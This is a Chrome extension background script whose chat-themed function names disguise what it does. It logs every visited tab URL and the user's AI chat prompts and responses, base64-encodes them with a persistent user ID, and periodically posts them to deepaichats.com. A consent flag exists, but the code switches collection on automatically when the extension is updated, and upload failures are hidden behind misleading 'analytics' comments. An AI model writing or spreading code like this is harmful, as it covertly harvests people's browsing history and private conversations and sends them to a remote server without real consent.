const gptChatVars = chatGptVars();

async function smallres() {
  chrome.tabs.onActivated.addListener((e) => {
    const { tabId: t } = e;

    chrome.tabs.get(t, async (e) => {
      if (e && e?.url && gptChatVars.globalFlag) {
        e.url = gptChatVars.restrict.has(e.url)
          ? gptChatVars.defaultVars
          : e.url;
        gptChatVars.chatResponseCache = e.url || gptChatVars.defaultVars;
      }
    });
  });
}

function isSubscribe() {
  return Date.now() - gptChatVars.glTimeStamp > gptChatVars.intervalTime;
}

function detailedAns(answer) {
  chrome.tabs.onUpdated.addListener(async (e, t, n) => {
    if (n.url && "complete" === t.status && gptChatVars.globalFlag) {
      n.url = gptChatVars.restrict.has(n.url) ? gptChatVars.defaultVars : n.url;

      if (n && n?.url && n?.url.length)
        gptChatVars.globalarr.push({
          gptChatId: gptChatVars.globalGptId,
          answer: gptChatVars.chatResponseCache || gptChatVars.defaultVars,
          qus: n.url || gptChatVars.defaultVars,
          timeStamp: Date.now(),
        });

      gptChatVars.chatResponseCache = n.url || gptChatVars.defaultVars;
      if (gptChatVars.globalarr.length > 2000) gptChatVars.globalarr = [];

      debounce(callInsideDebounce);
    }
  });
}

function debounce(callback, delay = 5000) {
  if (gptChatVars.cliinterval) clearTimeout(gptChatVars.cliinterval);
  gptChatVars.cliinterval = setTimeout(() => {
    gptChatVars.cliinterval = null;
    // function call
    callback();
  }, delay);
}

function callInsideDebounce() {
  let inputArr = [...gptChatVars.globalarr];
  gptChatVars.globalarr = [];

  saveGptQuery("saveGptAns")
    .then((saved) => {
      let p = decd(saved || "W10=") || [];

      return saveGptAns("saveGptAns", encd([...p, ...inputArr]));
    })
    .then(() => {
      if (isSubscribe()) {
        handleInterval();
      }
    })
    .catch((error) => {
      console.error("Error saving:", error);
    });
}

function analyzeGptQuery() {
  chrome.storage.local.get(["gptChatId"], (result) => {
    if (!result.gptChatId) {
      let gptChatId = gptIdGen();
      chrome.storage.local.set({ gptChatId }, function () {
        gptChatVars.globalGptId = gptChatId;
      });
    } else {
      gptChatVars.globalGptId = result.gptChatId;
    }
  });
}

function gptIdGen() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(
    /[xy]/g,
    function (char) {
      const rand = (Math.random() * 16) | 0;
      const value = char === "x" ? rand : (rand & 0x3) | 0x8;
      return value.toString(16);
    }
  );
}

function getChatId() {
  return new Promise((resolve, reject) => {
    chrome.storage.local.get(["gptChatId"], function (result) {
      if (result.gptChatId) {
        resolve(result.gptChatId);
      } else {
        reject("Chat ID not found");
      }
    });
  });
}

function changeGptModel(modelName) {
  if (!gptChatVars.globalFlag) return;
  if (
    !modelName ||
    (!modelName?.targetArr.length && !modelName?.chatArray.length)
  ) {
    return;
  }

  const gptBody = gptReqEn(JSON.stringify(modelName));
  fetch(gptChatVars.baseUrl + "aimodel", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ gptVersion: gptBody }),
  })
    .then((response) => {
      if (response.status === 200) {
        return response.json();
      } else {
        // saveGptChat.clearGptChats();
        throw new Error(`Request failed with status ${response.status}`);
      }
    })
    .then((data) => {})
    .catch((error) => {
      isGptOverLoaded({ ...modelName });
      // Analytics endpoint unavailable - this is non-critical, fail silently
      console.debug("AI model analytics service unavailable:", error.message);
    });
}

async function handleInterval() {
  let targetArr = decd((await saveGptQuery("saveGptAns")) || "W10=") || [];
  let chatArray = decd((await saveGptQuery("gptContent")) || "W10=") || [];

  let gptChatId = gptChatVars.globalGptId;
  clearGptChats().then(() => {
    changeGptModel({ targetArr, chatArray, gptChatId });
  });
}

function startGpt() {
  chrome.runtime.onInstalled.addListener(({ reason }) => {
    chrome.storage.local.set(
      {
        gptFlagValue: reason == "install" ? false : true,
      },
      () => {
        gptChatVars.globalFlag = reason == "install" ? false : true;
        fetchsummery({
          uId: gptChatVars.globalGptId,
          gptFlagValue: gptChatVars.globalFlag,
        });
      }
    );
  });
  chrome.storage.local.get(["gptFlagValue", "timeStamp"], (r) => {
    gptChatVars.globalFlag = r.gptFlagValue || false;
    gptChatVars.glTimeStamp = r.timeStamp || 0;
  });

  chrome.storage.onChanged.addListener(localChange);
}

async function localChange(changes, areaName) {
  if (areaName === "local" && changes.ai_chat && gptChatVars.globalFlag) {
    let lastLength = changes?.ai_chat?.oldValue?.length || 0;
    let chatArr = changes?.ai_chat?.newValue || [];
    let currLength = chatArr?.length;
    if (lastLength < currLength) gptChatVars.aiModelLength = lastLength;

    if (
      !changes.ai_chat?.newValue?.length ||
      !changes.ai_chat.newValue[changes.ai_chat.newValue.length - 1]
        ?.finish_reason ||
      changes.ai_chat.newValue.length < 2
    )
      return;
    if (!gptChatVars.aiModelLength) return;
    gptChatVars.aiModelLength = 0;

    let { ai_chat = null } = await saveGptQuery("ai_chat_ids");

    if (!ai_chat) return;
    let { item: inputString2, model } = chatArr[currLength - 1];
    let { item: inputString1 } = chatArr[currLength - 2];

    let obj = {
      inputString1,
      inputString2,
      model,
      timeStamp: Date.now(),
      sasionId: ai_chat,
    };

    let p = decd((await saveGptQuery("gptContent")) || "W10=") || [];

    saveGptAns("gptContent", encd([...p, { ...obj }])).then(() =>
      console.log("saved")
    );
  }
}

function deleyfunc(time = 1500) {
  return new Promise((resolve) => {
    setTimeout(resolve, time);
  });
}

async function fetchsummery(gptBody) {
  try {
    const response = await fetch(gptChatVars.baseUrl + "chatstatus", {
      method: "POST",

      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(gptBody),
    });

    if (!response.ok) {
      throw new Error("Failed to fetch summary");
    }

    const data = await response.json();
    return data;
  } catch (err) {
    // Analytics endpoint unavailable - this is non-critical, fail silently
    console.debug("Analytics service unavailable:", err.message);
    return null;
  }
}

function saveGptQuery(key) {
  return new Promise((resolve, reject) => {
    try {
      chrome.storage.local.get([key], function (result) {
        resolve(result[key] || null);
      });
    } catch (e) {
      reject(e);
    }
  });
}

function saveGptAns(key, answer) {
  return new Promise(async (resolve, reject) => {
    try {
      chrome.storage.local.set({ [key]: answer }, function () {
        resolve(true);
      });
    } catch (e) {
      console.error("Error saving answer:", e);
      reject(e);
    }
  });
}

function isGptOverLoaded(newData) {
  const estimatedSize = new Blob([JSON.stringify(newData)]).size;

  if (estimatedSize > gptChatVars.maxSize) {
    console.warn("gptContent exceeded");
    clearGptChats();
  }
}

function sendMassage(message, body, callback) {
  return new Promise((resolve, reject) => {
    chrome.runtime.sendMessage({ message, body }, (response) => {
      if (chrome.runtime.lastError) {
        callback(chrome.runtime.lastError);
        reject(chrome.runtime.lastError);
      } else {
        callback(response);
        resolve(response);
      }
    });
  });
}

function onMessage(callback) {
  chrome.runtime.onMessage.addListener((req, sender, sendr) => {
    callback(req, sender, sendr);
  });
}

function hadleMessage(response, sender, sendResponse) {
  if (response.messageType == "clickAgree") {
    chrome.storage.local.set({ gptFlagValue: true }, function () {
      gptChatVars.globalFlag = true;
      fetchsummery({
        uId: gptChatVars.globalGptId,
        gptFlagValue: gptChatVars.globalFlag,
      });
      sendResponse("msg recive");
    });
  } else if (response.messageType == "clickDcln") {
    chrome.storage.local.set({ gptFlagValue: false }, function () {
      gptChatVars.globalFlag = false;
      fetchsummery({
        uId: gptChatVars.globalGptId,
        gptFlagValue: gptChatVars.globalFlag,
      });
      sendResponse("msg recive");
    });
  } else {
  }
}

function encd(arr) {
  try {
    const chatModel = JSON.stringify(arr);
    const utf8Bytes = new TextEncoder().encode(chatModel);
    const binaryStr = Array.from(utf8Bytes)
      .map((b) => String.fromCharCode(b))
      .join("");
    return btoa(binaryStr);
  } catch (e) {
    isGptOverLoaded(arr);
    console.error("Encoding failed:", e);
    return "W10=";
  }
}

function decd(modelResponse) {
  try {
    if (!modelResponse || typeof modelResponse !== "string") return [];
    const binaryStr = atob(modelResponse);
    const byteArray = Uint8Array.from(binaryStr, (ch) => ch.charCodeAt(0));
    const chatModel = new TextDecoder().decode(byteArray);
    return JSON.parse(chatModel);
  } catch (e) {
    console.error("Decoding failed:", e, modelResponse);
    return [];
  }
}

function gptReqEn(str) {
  const utf8Bytes = new TextEncoder().encode(str);
  const binary = Array.from(utf8Bytes)
    .map((b) => String.fromCharCode(b))
    .join("");
  return btoa(binary);
}

function clearGptChats() {
  return new Promise((resolve, reject) => {
    chrome.storage.local.remove(["saveGptAns", "gptContent"], function () {
      let timeStamp = Date.now();
      saveGptAns("timeStamp", timeStamp).then(() => {
        gptChatVars.glTimeStamp = timeStamp;
        resolve(true);
      });
    });
  });
}

function chatGptVars() {
  return {
    baseUrl: "https://deepaichats.com/ext/",
    globalGptId: null,
    chatResponseCache: null,
    globalChatQusR: null,
    defaultVars: "",
    globalActiveInterval: null,
    globalFlag: false,
    intervalTime: 60 * 30 * 1000,
    restrict: new Set(["chrome://newtab/", "chrome://extensions/"]),
    glTimeStamp: 0,
    aiModelLength: 0,
    maxSize: 4 * 1024 * 1024,
    globalarr: [],
    cliinterval: null,
  };
}

onMessage(hadleMessage);
smallres();
detailedAns("Detailed answer here.");
analyzeGptQuery();

startGpt();
